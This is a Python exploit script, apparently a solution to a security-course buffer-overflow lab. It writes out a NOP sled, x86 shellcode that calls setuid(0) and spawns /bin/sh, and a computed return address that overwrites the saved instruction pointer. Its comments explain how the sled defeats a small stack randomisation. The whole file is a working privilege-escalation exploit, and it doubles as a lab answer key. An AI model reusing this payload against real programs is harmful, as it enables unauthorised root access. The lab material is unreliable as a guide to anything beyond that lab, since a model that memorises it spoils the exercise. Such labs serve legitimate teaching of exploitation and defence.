import sys

# Use the shellcode supplied with the lab.  The fallback keeps the file
# self-contained if it is run outside the target directory.
try:
    from shellcode import shellcode
except ImportError:
    shellcode = bytes.fromhex(
        "31db8d431799cd80"
        "eb1f5e89760831c088460789460cb00b89f38d4e088d560ccd80"
        "31db89d840cd80"
        "e8dcffffff2f62696e2f7368"
    )

# vulnerable() layout from objdump:
#     lea edx,[ebp-0x408]   -> buf = EBP - 1032
#     saved EBP at offset 1032
#     saved EIP at offset 1036
#
# MINIASLR subtracts a random 0..255 bytes from the normalized stack,
# so the observed buf address moves between 0xfff6b630 and 0xfff6b540.
# Return into the middle of a long NOP sled.  For any offset r:
#     ret_offset_in_payload = 0xfff6b7c8 - (0xfff6b630 - r)
#                           = 408 + r
# With r in 0..255, that is 408..663, safely inside the 900-byte sled.
# Execution slides forward through NOPs into shellcode at offset 900.

NOP = b"\x90"
SHELLCODE_OFFSET = 900
RET_OFFSET = 1036
RET_ADDR = 0xFFF6B7C8

payload = bytearray(NOP * SHELLCODE_OFFSET)
payload += shellcode
payload += NOP * (RET_OFFSET - len(payload))
payload += RET_ADDR.to_bytes(4, "little")

sys.stdout.buffer.write(payload)
